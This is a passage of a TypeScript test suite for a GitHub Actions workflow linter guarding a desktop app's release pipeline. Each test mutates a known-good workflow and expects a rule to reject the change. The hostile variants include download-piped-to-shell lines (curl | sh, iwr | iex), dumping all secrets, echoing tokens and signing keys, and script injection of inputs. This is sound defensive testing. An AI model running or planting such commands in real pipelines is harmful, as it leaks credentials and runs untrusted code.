      const plain = path.replace(/\$\{\{[^}]*\}\}/g, 'X')
      if (!/^updater-test-out\/[\w.-]+\.(exe|exe\.sig|json)$/.test(plain)) problems.push(`the artifact path is not an exact file name under updater-test-out/: ${path.slice(0, 80)}`)
    }
    if (step.with?.['retention-days'] !== 3) problems.push('the artifact is not kept for exactly 3 days')
  }

  return problems
}

/**
 * What only the release workflow must do (Phase 20, task 20.4). A Release is created as a DRAFT and never published or edited by the
 * workflow, so going public is a human click on GitHub; the commit being released must be on `main`, and its version must be the tag's.
 */
function releaseProblems(jobs: [string, Job][], steps: { job: string; step: Step }[]): string[] {
  const problems: string[] = []
  const publish = jobs.find(([name]) => name === 'publish')?.[1]

  if (publish === undefined) problems.push('has no job named publish (the only job that may write)')
  else if (publish.needs === undefined) problems.push('job publish does not wait for the builds (needs)')

  const attest = jobs.find(([name]) => name === 'attest')?.[1]
  if (attest === undefined) problems.push('has no job named attest (build provenance for every installer)')
  else {
    const attestStep = (attest.steps ?? []).find((step) => step.uses?.startsWith('actions/attest-build-provenance@'))
    if (attestStep === undefined) problems.push('job attest does not use actions/attest-build-provenance')
    const subjects = String(attestStep?.with?.['subject-path'] ?? '')
    if (attestStep !== undefined && !(subjects.includes('*.exe') && subjects.includes('*.dmg'))) problems.push('job attest does not attest every installer (*.exe and *.dmg)')
    if (attestStep !== undefined && !subjects.includes('*.tar.gz')) problems.push('job attest does not attest the update archive (*.tar.gz)')
    if ((attest.steps ?? []).some((step) => step.run !== undefined)) problems.push('job attest runs a script (it holds the signing token: it only downloads and attests)')
  }
  const waits = (job: Job | undefined, name: string) => [job?.needs].flat().includes(name)
  if (publish !== undefined && !waits(publish, 'attest')) problems.push('job publish does not wait for attest')

  const runs = steps.filter(({ step }) => step.run !== undefined).map(({ job, step }) => ({ job, run: step.run! }))
  // Every job that builds an installer checks, before building, that the tag is a release of main at this version.
  for (const [name] of jobs.filter(([name]) => name !== 'publish' && name !== 'attest')) {
    const own = runs.filter(({ job }) => job === name)
    if (!own.some(({ run }) => /git merge-base --is-ancestor/.test(run))) problems.push(`job ${name} never checks that the tagged commit is on main (git merge-base --is-ancestor)`)
    if (!own.some(({ run }) => /\b(Get-Content|plutil|jq|node)\b[^\n]*package\.json/.test(run))) problems.push(`job ${name} never checks that the tag matches the version in package.json`)
  }

  // The updater key (20.12a). A build job makes its own throw-away key and uses it for the build step alone; nothing else, anywhere, names it.
  const builds = jobs.filter(([name]) => name !== 'publish' && name !== 'attest')
  for (const [name, job] of jobs) {
    if (/TAURI_SIGNING/.test(JSON.stringify({ ...job, steps: undefined }))) problems.push(`job ${name}: names the updater key outside a step's env (it is for one build step only)`)
  }
  for (const { job, step } of steps) {
    const isBuild = builds.some(([name]) => name === job)
    for (const [name, value] of Object.entries(step.env ?? {}).filter(([key]) => key.startsWith('TAURI_SIGNING'))) {
      if (!isBuild) problems.push(`job ${job}: has the updater key variable ${name} (only a build job has a key, and it is throw-away)`)
      else if (name === 'TAURI_SIGNING_PRIVATE_KEY' && value !== THROWAWAY_KEY) problems.push(`job ${job}: ${name} is ${JSON.stringify(value)}, not the job's own throw-away key file`)
      else if (name === 'TAURI_SIGNING_PRIVATE_KEY_PASSWORD' && value !== '') problems.push(`job ${job}: ${name} is not empty (the throw-away key has no password)`)
      else if (name !== 'TAURI_SIGNING_PRIVATE_KEY' && name !== 'TAURI_SIGNING_PRIVATE_KEY_PASSWORD') problems.push(`job ${job}: uses ${name} (only the key file and an empty password are allowed)`)
    }
    if (step.run !== undefined && /TAURI_SIGNING/.test(step.run)) problems.push(`job ${job}: a run: script names the updater key (the CLI reads it from the step's env)`)
  }
  for (const [name, job] of builds) {
    const own = (job.steps ?? [])
    if (!own.some((step) => /\bsigner generate\b[^\n]*--ci[^\n]*-w\s+"(\$env:RUNNER_TEMP|\$RUNNER_TEMP)\/updater-throwaway\.key"/.test(step.run ?? ''))) {
      problems.push(`job ${name} does not make its own throw-away key (tauri signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key")`)
    }
    const building = own.filter((step) => /\btauri:build\b/.test(step.run ?? ''))
    if (!building.some((step) => step.env?.['TAURI_SIGNING_PRIVATE_KEY'] === THROWAWAY_KEY && step.env?.['TAURI_SIGNING_PRIVATE_KEY_PASSWORD'] === '')) {
      problems.push(`job ${name}: the build step does not get the throw-away key (the update files cannot be bundled without one)`)
    }
    if (!building.some((step) => (step.run ?? '').split('\n').some((line) => /\btauri:build\b/.test(line) && line.includes(`--config ${UPDATER_OVERLAY}`)))) {
      problems.push(`job ${name}: the build does not pass --config ${UPDATER_OVERLAY} (no update files without it)`)
    }
  }
  // The Windows installer's name carries the version the app was built with; it has to be the tag's (as the macOS job checks its plist).
  const windows = jobs.find(([name]) => name === 'build' || name === 'build-windows')?.[1]
  const windowsRun = (windows?.steps ?? []).map((step) => step.run ?? '').join('\n')
  if (windows !== undefined && !(/_x64-setup\.exe/.test(windowsRun) && /\$env:TAG/.test(windowsRun) && /\.Name -ne \$expected/.test(windowsRun))) {
    problems.push("the Windows build job does not check that the installer's name carries the tag's version (Listulator_<version>_x64-setup.exe)")
  }
  // The files that travel are checked as they are handed on: no signature among them, and the update archive is among them.
  const publishRun = (publish?.steps ?? []).map((step) => step.run ?? '').join('\n')
  if (publish !== undefined && !/\*\.tar\.gz/.test(publishRun)) problems.push('job publish does not handle the update archive (*.tar.gz)')
  if (publish !== undefined && !/\*\.sig/.test(publishRun)) problems.push('job publish does not refuse a signature file (*.sig) in the build output')
  if (publish !== undefined && !(/gh attestation verify/.test(publishRun) && /for file in [^\n]*\*\.exe[^\n]*\*\.dmg[^\n]*\*\.tar\.gz/.test(publishRun))) {
    problems.push('job publish does not verify the attestation of every file it drafts (*.exe, *.dmg and *.tar.gz)')
  }
  // The app inside the update archive is audited as the one in the disk image is: after an update, it is the one people run.
  const macos = jobs.find(([name]) => name === 'build-macos')?.[1]
  const macosRun = (macos?.steps ?? []).map((step) => step.run ?? '').join('\n')
  if (macos !== undefined && !(/Listulator\.app\.tar\.gz/.test(macosRun) && /\btar -xzf\b/.test(macosRun) && /codesign --verify/.test(macosRun))) {
    problems.push('job build-macos does not unpack and audit the update archive (Listulator.app.tar.gz)')
  }
  if (macos !== undefined && !/CFBundleIdentifier[^\n]*= com\.listulator\.desktop \]/.test(macosRun)) {
    problems.push('job build-macos does not check that the app identifier is com.listulator.desktop (a test or dev build must not be released)')
  }

  for (const { job, run } of runs) {
    if (/\bgh\s+release\b/.test(run) && job !== 'publish') problems.push(`job ${job}: uses gh release (only publish creates a Release)`)
    if (/\bgh\s+release\s+create\b/.test(run) && !/--draft(?!=)/.test(run)) problems.push(`job ${job}: gh release create without --draft`)
    if (/--draft=false|\bgh\s+release\s+(edit|delete)\b/.test(run)) problems.push(`job ${job}: edits or deletes a Release or un-drafts it (publishing is a human click)`)
  }

  return problems
}

const sha = (letter: string) => letter.repeat(40)

/** A workflow that breaks no rule; each hostile one below changes one thing in it. */
const GOOD = `
name: Test
on:
  workflow_dispatch:
    inputs:
      profile:
        type: choice
        options: [release, debug]
permissions:
  contents: read
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
      - name: Build
        env:
          PROFILE: \${{ inputs.profile || 'release' }}
        run: npm ci --ignore-scripts
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Rust
        shell: pwsh
        run: |
          $channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line
          rustup toolchain install $channel --profile minimal --no-self-update
      - name: Installer
        shell: pwsh
        run: |
          if ($true) {
            npm run tauri:build -w @listulator/desktop -- --bundles nsis --debug -- --locked
          } else {
            npm run tauri:build -w @listulator/desktop -- --bundles nsis -- --locked
          }
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: x
          path: y
          retention-days: 3
`

const parse = (text: string) => loadYaml(text) as Workflow

describe('the rules for a workflow, proven on hostile workflows', () => {
  it('accept a workflow that breaks none', () => {
    expect(workflowProblems(parse(GOOD))).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a pull request trigger', (t) => t.replace('  workflow_dispatch:', '  pull_request:\n  workflow_dispatch:'), /not by hand only/],
    ['a push trigger instead', (t) => t.replace('  workflow_dispatch:\n    inputs:\n      profile:\n        type: choice\n        options: [release, debug]', '  push:'), /not by hand only/],
    ['write permission', (t) => t.replace('contents: read', 'contents: write'), /permissions: \{ contents: read \}/],
    ['no permissions at all', (t) => t.replace('permissions:\n  contents: read\n', ''), /permissions: \{ contents: read \}/],
    ['a job that widens its permissions', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    permissions:\n      contents: write'), /widens its permissions/],
    ['an action named by tag', (t) => t.replace(`actions/checkout@${sha('a')} # v1`, 'actions/checkout@v4'), /not a GitHub-owned action pinned/],
    ['an action from another owner, pinned', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, `someone/else@${sha('b')}`), /not a GitHub-owned action pinned/],
    ['a local action', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, './.github/actions/mine'), /not a GitHub-owned action pinned/],
    ['a docker action', (t) => t.replace(`actions/upload-artifact@${sha('b')}`, 'docker://alpine:3'), /not a GitHub-owned action pinned/],
    ['a self-hosted runner', (t) => t.replace('windows-latest', 'self-hosted'), /not a GitHub-hosted runner/],
    ['a runner list with self-hosted', (t) => t.replace('windows-latest', '[self-hosted, linux]'), /not a GitHub-hosted runner/],
    ['a runner chosen by an expression', (t) => t.replace('windows-latest', '${{ inputs.runner }}'), /not a GitHub-hosted runner/],
    ['a checkout that keeps credentials', (t) => t.replace('          persist-credentials: false', '          fetch-depth: 0'), /persist-credentials: false/],
    ['a checkout that sets it true', (t) => t.replace('persist-credentials: false', 'persist-credentials: true'), /persist-credentials: false/],
    ['an artifact kept a month', (t) => t.replace('retention-days: 3', 'retention-days: 30'), /retention-days/],
    ['an artifact with no retention set', (t) => t.replace('          retention-days: 3\n', ''), /retention-days/],
    ['an input pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ inputs.profile }}"), /contains \$\{\{/],
    ['a branch name pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ github.head_ref }}"), /contains \$\{\{/],
    ['an output pasted into a script', (t) => t.replace('run: npm ci --ignore-scripts', "run: echo ${{ steps.x.outputs.y }}"), /contains \$\{\{/],
    ['a download piped to a shell', (t) => t.replace('run: npm ci --ignore-scripts', 'run: curl -fsSL https://example.com/i.sh | sh'), /downloads or evaluates/],
    ['a PowerShell download evaluated', (t) => t.replace('run: npm ci --ignore-scripts', "run: iwr https://example.com/i.ps1 | iex"), /downloads or evaluates/],
    ['npx of a package named on the fly', (t) => t.replace('run: npm ci --ignore-scripts', 'run: npx some-package'), /uses npx/],
    ['a secret in the usual spelling', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'TOKEN: ${{ secrets.TOKEN }}'), /secret or the token/],
    ['a secret by index', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", "TOKEN: ${{ secrets['TOKEN'] }}"), /secret or the token/],
    ['all secrets as JSON', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'ALL: ${{ toJSON(secrets) }}'), /secret or the token/],
    ['the workflow token handed to a step', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'T: ${{ github.token }}'), /secret or the token/],
    ['the token under its usual name', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'GITHUB_TOKEN: ${{ github.token }}'), /secret or the token/],
    ['GITHUB_TOKEN read in a script', (t) => t.replace('run: npm ci --ignore-scripts', 'run: echo $env:GITHUB_TOKEN'), /secret or the token/],
    ['secrets: inherit on a job', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    secrets: inherit'), /passes secrets/],
    ['a job that may fail quietly', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    continue-on-error: true'), /continue-on-error/],
    ['a step that may fail quietly', (t) => t.replace('        run: npm ci --ignore-scripts', '        continue-on-error: true\n        run: npm ci --ignore-scripts'), /continue-on-error/],
    ['an environment', (t) => t.replace('    runs-on: windows-latest', '    runs-on: windows-latest\n    environment: release'), /uses an environment/],
    ['a node version named in the workflow', (t) => t.replace('node-version-file: .node-version', 'node-version: 26'), /names a node-version/],
    ['a node version range', (t) => t.replace('node-version-file: .node-version', 'node-version: ">=20"\n          node-version-file: .node-version'), /names a node-version/],
    ['a node version file that is not .node-version', (t) => t.replace('node-version-file: .node-version', 'node-version-file: package.json'), /does not read .node-version/],
    ['rustup given stable', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup toolchain install stable --profile minimal rust-toolchain.toml'), /moving channel/],
    ['rustup default stable', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup default stable # rust-toolchain.toml'), /moving channel/],
    ['rustup given a nightly', (t) => t.replace('rustup toolchain install $channel --profile minimal --no-self-update', 'rustup toolchain install nightly # rust-toolchain.toml'), /moving channel/],
    ['rustup with a version written in the workflow, not read from the file', (t) => t.replace("$channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line\n          rustup toolchain install $channel", 'rustup toolchain install 1.98.1'), /does not take its version from rust-toolchain.toml/],
    ['a tauri build without --locked (the release branch)', (t) => t.replace('--bundles nsis -- --locked', '--bundles nsis'), /not run with --locked/],
    ['a tauri build without --locked (the debug branch)', (t) => t.replace('--debug -- --locked', '--debug'), /not run with --locked/],
    ['a cargo build without --locked', (t) => t.replace('run: npm ci --ignore-scripts', 'run: cargo build --release'), /not run with --locked/],
    ['the updater key variable in a manual workflow', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'TAURI_SIGNING_PRIVATE_KEY: x'), /names the updater key/],
    ['the updater-artifacts overlay in a manual workflow', (t) => t.replace('--bundles nsis --debug -- --locked', '--bundles nsis --debug --config src-tauri/tauri.updater-artifacts.conf.json -- --locked'), /names the updater key or the updater-artifacts overlay/],
    ['a repository variable in a manual workflow', (t) => t.replace("PROFILE: ${{ inputs.profile || 'release' }}", 'V: ${{ vars.SOMETHING }}'), /reads a repository variable/],
    ['a cargo test without --locked', (t) => t.replace('run: npm ci --ignore-scripts', 'run: cargo test'), /not run with --locked/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD)

    expect(changed).not.toBe(GOOD)
    expect(workflowProblems(parse(changed)).join(' | ')).toMatch(expected)
  })
})


/** A release workflow that breaks no rule; each hostile one below changes one thing in it. */
const GOOD_RELEASE = `
name: Release
on:
  push:
    tags: ['v*']
permissions:
  contents: read
jobs:
  build:
    runs-on: windows-2025
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
          fetch-depth: 0
      - name: The tag is a release of main
        shell: pwsh
        env:
          TAG: \${{ github.ref_name }}
        run: |
          git merge-base --is-ancestor $env:GITHUB_SHA origin/main
          $version = (Get-Content package.json | ConvertFrom-Json).version
          if ("v$version" -ne $env:TAG) { throw 'tag and version differ' }
      - uses: actions/setup-node@${sha('c')} # v1
        with:
          node-version-file: .node-version
      - name: Rust
        shell: pwsh
        run: |
          $channel = (Select-String -Path rust-toolchain.toml -Pattern '^channel').Line
          rustup toolchain install $channel --profile minimal --no-self-update
      - name: Throw-away key
        shell: pwsh
        run: npm run tauri -w @listulator/desktop -- signer generate --ci -w "$env:RUNNER_TEMP/updater-throwaway.key"
      - name: Installer
        shell: pwsh
        env:
          TAURI_SIGNING_PRIVATE_KEY: \${{ runner.temp }}/updater-throwaway.key
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ''
        run: npm run tauri:build -w @listulator/desktop -- --bundles nsis --config src-tauri/tauri.updater-artifacts.conf.json -- --locked
      - name: The installer carries the tag
        shell: pwsh
        env:
          TAG: \${{ github.ref_name }}
        run: |
          $expected = "Listulator_$($env:TAG.Substring(1))_x64-setup.exe"
          if (@($installers).Count -ne 1 -or $installers[0].Name -ne $expected) { throw 'wrong installer' }
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: installer
          path: x
          retention-days: 3
  build-macos:
    runs-on: macos-15
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@${sha('a')} # v1
        with:
          persist-credentials: false
          fetch-depth: 0
      - name: The tag is a release of main
        env:
          TAG: \${{ github.ref_name }}
        run: |
          git merge-base --is-ancestor "$GITHUB_SHA" origin/main
          test "v$(node -p "require('./package.json').version")" = "$TAG"
      - name: Throw-away key
        run: npm run tauri -w @listulator/desktop -- signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key"
      - name: Installer
        env:
          TAURI_SIGNING_PRIVATE_KEY: \${{ runner.temp }}/updater-throwaway.key
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ''
        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg --config src-tauri/tauri.updater-artifacts.conf.json -- --locked
      - name: Audit
        run: |
          tar -xzf Listulator.app.tar.gz -C unpacked
          codesign --verify --deep --strict unpacked/Listulator.app
          [ "$(plutil -extract CFBundleIdentifier raw -o - unpacked/Listulator.app/Contents/Info.plist)" = com.listulator.desktop ] || exit 1
      - uses: actions/upload-artifact@${sha('b')} # v1
        with:
          name: dmg
          path: y
          retention-days: 3
  attest:
    needs: [build, build-macos]
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      id-token: write
      attestations: write
    steps:
      - uses: actions/download-artifact@${sha('d')} # v1
        with:
          path: dist
      - uses: actions/attest-build-provenance@${sha('e')} # v1
        with:
          subject-path: |
            dist/*.exe
            dist/*.dmg
            dist/*.tar.gz
  publish:
    needs: [build, build-macos, attest]
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/download-artifact@${sha('d')} # v1
        with:
          name: installer
      - name: Draft the Release
        env:
          GH_TOKEN: \${{ github.token }}
          TAG: \${{ github.ref_name }}
        run: |
          if compgen -G '*.sig' > /dev/null; then exit 1; fi
          for file in *.exe *.dmg *.tar.gz; do gh attestation verify "$file" --repo x; done
          sha256sum -- *.exe *.dmg *.tar.gz > SHA256SUMS
          gh release create "$TAG" --draft --verify-tag --title "Listulator $TAG" --notes "Draft" -- *.exe *.dmg *.tar.gz SHA256SUMS
`

describe('the rules for the release workflow, proven on hostile workflows', () => {
  const release = (text: string) => workflowProblems(parse(text), 'release')

  it('accept a release workflow that breaks none', () => {
    expect(release(GOOD_RELEASE)).toEqual([])
  })

  const hostile: [string, (text: string) => string, RegExp][] = [
    ['a branch trigger as well', (t) => t.replace("    tags: ['v*']", "    tags: ['v*']\n    branches: [main]"), /not only by a pushed v\* tag/],
    ['a push to any branch instead of a tag', (t) => t.replace("    tags: ['v*']", '    branches: [main]'), /not only by a pushed v\* tag/],
    ['a pull request trigger as well', (t) => t.replace('  push:', '  pull_request:\n  push:'), /not only by a pushed v\* tag/],
    ['a button with a debug input', (t) => t.replace('  push:', '  workflow_dispatch:\n    inputs:\n      debug:\n        type: boolean\n  push:'), /not only by a pushed v\* tag/],
    ['any tag, not only v*', (t) => t.replace("tags: ['v*']", "tags: ['*']"), /not only by a pushed v\* tag/],
    ['write permission for the whole workflow', (t) => t.replace('permissions:\n  contents: read\njobs:', 'permissions:\n  contents: write\njobs:'), /permissions: \{ contents: read \}/],
    ['write permission in the build job', (t) => t.replace('    runs-on: windows-2025\n    permissions:\n      contents: read', '    runs-on: windows-2025\n    permissions:\n      contents: write'), /job build widens/],
    ['an id-token in the build job', (t) => t.replace('    runs-on: windows-2025\n    permissions:\n      contents: read', '    runs-on: windows-2025\n    permissions:\n      contents: read\n      id-token: write'), /job build widens/],
    ['more than contents in the publish job', (t) => t.replace('      contents: write', '      contents: write\n      attestations: write'), /job publish widens/],
    ['a moving runner image', (t) => t.replace('windows-2025', 'windows-latest'), /names its image/],
    ['the token in the build job', (t) => t.replace('          TAG: ${{ github.ref_name }}\n        run: |\n          git merge', '          TAG: ${{ github.ref_name }}\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          git merge'), /secret or the token/],
    ['the token under another name in publish', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'OTHER: ${{ github.token }}'), /secret or the token/],
    ['a secret in publish', (t) => t.replace('GH_TOKEN: ${{ github.token }}', 'GH_TOKEN: ${{ secrets.PAT }}'), /secret or the token/],
    ['an environment', (t) => t.replace('  publish:\n    needs: [build, build-macos, attest]', '  publish:\n    needs: [build, build-macos, attest]\n    environment: release'), /uses an environment/],
    ['an action named by tag', (t) => t.replace(`actions/download-artifact@${sha('d')} # v1`, 'actions/download-artifact@v8'), /not a GitHub-owned action pinned/],
    ['an action from another owner', (t) => t.replace(`actions/download-artifact@${sha('d')}`, `softprops/action-gh-release@${sha('d')}`), /not a GitHub-owned action pinned/],
    ['a Release that is not a draft', (t) => t.replace('--draft ', ''), /without --draft/],
    ['a Release published after it is drafted', (t) => t.replace('--draft ', '--draft=false '), /un-drafts/],
    ['a Release edited afterwards', (t) => t.replace('sha256sum -- *.exe', 'gh release edit "$TAG" --latest\n          sha256sum -- *.exe'), /edits or deletes/],
    ['gh release in the build job', (t) => t.replace('          git merge-base', '          gh release list\n          git merge-base'), /uses gh release/],
    ['no check that the commit is on main', (t) => t.replace('git merge-base --is-ancestor $env:GITHUB_SHA origin/main', 'git log -1'), /on main/],
    ['no check that the tag is the version', (t) => t.replace('package.json', 'something.json'), /matches the version/],
    ['the macOS job without the ancestry check', (t) => t.replace('git merge-base --is-ancestor "$GITHUB_SHA" origin/main', 'git log -1'), /job build-macos never checks.*on main/],
    ['the macOS job without the version check', (t) => t.replace("test \"v$(node -p \"require('./package.json').version\")\" = \"$TAG\"", 'true'), /job build-macos never checks.*version in package.json/],
    ['a moving macOS image', (t) => t.replace('macos-15', 'macos-latest'), /names its image/],
    ['a macOS build that may write', (t) => t.replace('  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: read', '  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: write'), /job build-macos widens/],
    ['an attest job with write access to the repository', (t) => t.replace('  attest:\n    needs: [build, build-macos]\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read', '  attest:\n    needs: [build, build-macos]\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: write'), /job attest widens/],
    ['the signing token in the publish job', (t) => t.replace(`      contents: write\n    steps:\n      - uses: actions/download-artifact@${sha('d')} # v1\n        with:\n          name: installer`, `      contents: write\n      id-token: write\n    steps:\n      - uses: actions/download-artifact@${sha('d')} # v1\n        with:\n          name: installer`), /job publish widens/],
    ['the signing token in a build job', (t) => t.replace('  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: read', '  build-macos:\n    runs-on: macos-15\n    permissions:\n      contents: read\n      id-token: write\n      attestations: write'), /job build-macos widens/],
    ['an attest job that also writes an extra permission', (t) => t.replace('      attestations: write\n    steps:', '      attestations: write\n      packages: write\n    steps:'), /job attest widens/],
    ['an attest job that runs a script', (t) => t.replace(`      - uses: actions/attest-build-provenance@${sha('e')} # v1`, `      - run: echo hello\n      - uses: actions/attest-build-provenance@${sha('e')} # v1`), /attest runs a script/],
    ['an attest job that attests only the Windows installer', (t) => t.replace('            dist/*.exe\n            dist/*.dmg\n            dist/*.tar.gz', '            dist/*.exe'), /attest every installer/],
    ['an attest job that leaves the update archive out', (t) => t.replace('\n            dist/*.tar.gz', ''), /does not attest the update archive/],
    ['an attest job with no attestation step', (t) => t.replace(`actions/attest-build-provenance@${sha('e')} # v1`, `actions/upload-artifact@${sha('e')} # v1`), /does not use actions\/attest-build-provenance/],
    ['the attestation action named by tag', (t) => t.replace(`actions/attest-build-provenance@${sha('e')} # v1`, 'actions/attest-build-provenance@v4'), /not a GitHub-owned action pinned/],
    ['the attestation action from another owner', (t) => t.replace(`actions/attest-build-provenance@${sha('e')}`, `someone/attest@${sha('e')}`), /not a GitHub-owned action pinned/],
    ['no attest job', (t) => t.replace('  attest:', '  other:'), /no job named attest/],
    ['no publish job', (t) => t.replace('  publish:', '  other:'), /no job named publish/],
    ['a publish job that does not wait', (t) => t.replace('    needs: [build, build-macos, attest]\n', ''), /does not wait/],
    ['the tag pasted into a script', (t) => t.replace('gh release create "$TAG"', 'gh release create ${{ github.ref_name }}'), /contains \$\{\{/],
    // The updater key (20.12a, SR-063): a build job's own throw-away key, for its build step only, and nothing else anywhere.
    ['the updater key read from a secret', (t) => t.replace('TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key', 'TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.UPDATER_KEY }}'), /secret or the token/],
    ['the updater key read from a variable', (t) => t.replace('TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key', 'TAURI_SIGNING_PRIVATE_KEY: ${{ vars.UPDATER_KEY }}'), /reads a repository variable/],
    ['the updater key as text in the workflow', (t) => t.replace('TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key', 'TAURI_SIGNING_PRIVATE_KEY: dW50cnVzdGVk'), /not the job's own throw-away key file/],
    ['the updater key from another file', (t) => t.replace('${{ runner.temp }}/updater-throwaway.key', '${{ runner.temp }}/real.key'), /not the job's own throw-away key file/],
    ['a password for the throw-away key', (t) => t.replace("TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ''", "TAURI_SIGNING_PRIVATE_KEY_PASSWORD: hunter2"), /is not empty/],
    ['the key path variable', (t) => t.replace('TAURI_SIGNING_PRIVATE_KEY_PASSWORD: \'\'', 'TAURI_SIGNING_PRIVATE_KEY_PATH: x'), /only the key file and an empty password/],
    ['the updater key in the publish job', (t) => t.replace('          GH_TOKEN: ${{ github.token }}\n', '          GH_TOKEN: ${{ github.token }}\n          TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key\n'), /only a build job has a key/],
    ['the updater key for a whole job', (t) => t.replace('  build-macos:\n    runs-on: macos-15\n', '  build-macos:\n    runs-on: macos-15\n    env:\n      TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key\n'), /outside a step's env/],
    ['the updater key for the whole workflow', (t) => t.replace('permissions:\n  contents: read\njobs:', 'permissions:\n  contents: read\nenv:\n  TAURI_SIGNING_PRIVATE_KEY: x\njobs:'), /at the workflow level/],
    ['the updater key printed by a script', (t) => t.replace('run: npm run tauri -w @listulator/desktop -- signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key"', 'run: echo $TAURI_SIGNING_PRIVATE_KEY'), /a run: script names the updater key/],
    ['a build job with no throw-away key of its own', (t) => t.replace('signer generate --ci -w "$env:RUNNER_TEMP/updater-throwaway.key"', 'signer generate --ci -w "$env:RUNNER_TEMP/other.key"'), /job build does not make its own throw-away key/],
    ['a macOS build job with no throw-away key of its own', (t) => t.replace('signer generate --ci -w "$RUNNER_TEMP/updater-throwaway.key"', 'signer generate --ci'), /job build-macos does not make its own throw-away key/],
    ['a build step with no key', (t) => t.replace("          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ''\n        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg", "        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg").replace('          TAURI_SIGNING_PRIVATE_KEY: ${{ runner.temp }}/updater-throwaway.key\n        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg', '        run: npm run tauri:build -w @listulator/desktop -- --bundles app,dmg'), /job build-macos: the build step does not get the throw-away key/],
    ['a build that does not switch the update files on', (t) => t.replace(' --config src-tauri/tauri.updater-artifacts.conf.json -- --locked', ' -- --locked'), /does not pass --config/],
    ['the overlay on another line than the build', (t) => t.replace('--bundles nsis --config src-tauri/tauri.updater-artifacts.conf.json -- --locked', '--bundles nsis -- --locked # --config src-tauri/tauri.updater-artifacts.conf.json').replace('# --config src-tauri/tauri.updater-artifacts.conf.json', '#'), /job build: the build does not pass --config/],
    ['a Windows job that does not check the installer carries the tag’s version', (t) => t.replace('_x64-setup.exe', '_x64.exe'), /does not check that the installer's name/],
    ['a macOS job that does not check the app identifier', (t) => t.replace('= com.listulator.desktop ]', '= com.listulator.desktop.dev ]'), /does not check that the app identifier is com\.listulator\.desktop/],
    ['a signature file uploaded', (t) => t.replace('          name: installer\n          path: x', '          name: installer\n          path: x/*.exe.sig'), /takes a \.sig file/],
    ['a publish job that never mentions the update archive', (t) => t.replace('for file in *.exe *.dmg *.tar.gz; do', 'for file in *.exe *.dmg; do').replace('sha256sum -- *.exe *.dmg *.tar.gz > SHA256SUMS', 'sha256sum -- *.exe *.dmg > SHA256SUMS').replace('-- *.exe *.dmg *.tar.gz SHA256SUMS', '-- *.exe *.dmg SHA256SUMS'), /does not handle the update archive/],
    ['a macOS job that does not unpack the update archive', (t) => t.replace('tar -xzf Listulator.app.tar.gz -C unpacked', 'true'), /does not unpack and audit the update archive/],
    ['a publish job that does not verify the archive’s attestation', (t) => t.replace('for file in *.exe *.dmg *.tar.gz; do', 'for file in *.exe *.dmg; do'), /does not verify the attestation of every file/],
    ['a publish job that does not refuse a signature file', (t) => t.replace("          if compgen -G '*.sig' > /dev/null; then exit 1; fi\n", ''), /does not refuse a signature file/],
    ['an artifact kept a month', (t) => t.replace('retention-days: 3', 'retention-days: 30'), /retention-days/],
    ['a build without --locked', (t) => t.replace('tauri.updater-artifacts.conf.json -- --locked', 'tauri.updater-artifacts.conf.json'), /not run with --locked/],
  ]

  it.each(hostile)('refuse %s', (_name, change, expected) => {
    const changed = change(GOOD_RELEASE)

    expect(changed).not.toBe(GOOD_RELEASE)
    expect(release(changed).join(' | ')).toMatch(expected)
  })

